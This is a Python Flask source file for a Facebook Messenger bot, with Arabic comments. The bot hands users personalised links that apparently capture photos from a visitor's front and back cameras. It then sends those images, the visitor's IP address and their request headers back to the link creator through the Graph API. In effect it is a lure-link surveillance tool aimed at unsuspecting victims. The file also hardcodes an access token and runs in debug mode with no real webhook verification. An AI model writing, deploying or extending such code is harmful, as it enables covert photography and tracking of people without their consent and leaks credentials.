import os
import requests
import json
from flask import Flask, request, jsonify, render_template
from datetime import datetime

app = Flask(__name__)

ACCESS_TOKEN = "EAAQQA1jZB5X4BO2xMCZCOEMpjj8sZANib8YPx1hGBp8EVRAATtLCbV041Wke1Y3K0fEF6n0h3ZBEkGm7wwoENo51XZB1UipOVcn2mWDNjSfbsj2q7f7gKTZA27RyWpz6yLjnRWM6PxwiDrD8qDXbQu72UZCDoMJS9ZCSGEyZBIZASxP2ZBweZCKNxxPAdqqCiwLrsKIpRAZDZD"
DOMAIN = "https://bogrinaxp.onrender.com"

# تخزين بيانات المستخدمين والروابط
user_data = {}

@app.route("/", methods=["GET"])
def index():
    return jsonify({"message": "API is working!"}), 200

@app.route("/webhook", methods=["GET", "POST"])
def webhook():
    if request.method == "GET":
        mode = request.args.get("hub.mode")
        challenge = request.args.get("hub.challenge")
        verify_token = request.args.get("hub.verify_token")
        if mode == "subscribe" and verify_token:
            return challenge
        else:
            return jsonify({"message": "Invalid verify token"}), 401
    elif request.method == "POST":
        body = request.get_json()
        if body["object"] == "page":
            entry = body["entry"][0]
            messaging_event = entry["messaging"][0]
            sender_id = messaging_event["sender"]["id"]
            if "message" in messaging_event:
                message_text = messaging_event["message"]["text"]

                # إنشاء رابط جديد
                if message_text.startswith("creatr-url["):
                    name = message_text.split("[")[1].split("]")[0]
                    user_data[sender_id] = {"name": name, "link": f"{DOMAIN}/{sender_id}/{name}"}
                    send_message(sender_id, f"تم إنشاء الرابط: {user_data[sender_id]['link']}")
            return jsonify({"message": "Message received!"}), 200

@app.route("/<user_id>/<name>", methods=["GET"])
def dynamic_link(user_id, name):
    if user_id in user_data and user_data[user_id]["name"] == name:
        return render_template("capture.html", user_id=user_id, name=name)
    return "Name not found!", 404

@app.route("/upload", methods=["POST"])
def upload():
    user_id = request.form.get("user_id")
    name = request.form.get("name")
    front_image = request.files.get("front_image")
    back_image = request.files.get("back_image")

    if user_id in user_data and user_data[user_id]["name"] == name:
        # حفظ الصور
        front_image_path = f"uploads/{user_id}_front_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
        back_image_path = f"uploads/{user_id}_back_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"
        front_image.save(front_image_path)
        back_image.save(back_image_path)

        # جمع المعلومات
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        headers = dict(request.headers)
        device_info = f"تم فتح الرابط من:\nIP: {ip}\nHeaders: {json.dumps(headers, indent=2)}"

        # إرسال الصور والمعلومات إلى المستخدم
        send_message(user_id, f"تم استلام الصور والمعلومات:\n{device_info}")
        send_image(user_id, front_image_path)
        send_image(user_id, back_image_path)

        return jsonify({"message": "تم استلام الصور بنجاح!"}), 200
    return "Name not found!", 404

def send_message(sender, message):
    api = "https://graph.facebook.com/v21.0/me/messages"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "message": {"text": message},
        "recipient": {"id": sender}
    }
    requests.post(api, data=json.dumps(payload), headers=headers)

def send_image(sender, image_path):
    api = "https://graph.facebook.com/v21.0/me/messages"
    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
    }
    files = {
        "recipient": (None, json.dumps({"id": sender})),
        "message": (None, json.dumps({"attachment": {"type": "image", "payload": {"is_reusable": True}}})),
        "filedata": (image_path, open(image_path, "rb"), "image/jpeg")
    }
    requests.post(api, headers=headers, files=files)

if __name__ == "__main__":
    os.makedirs("uploads", exist_ok=True)
    app.run(host="0.0.0.0", port=5000, debug=True)
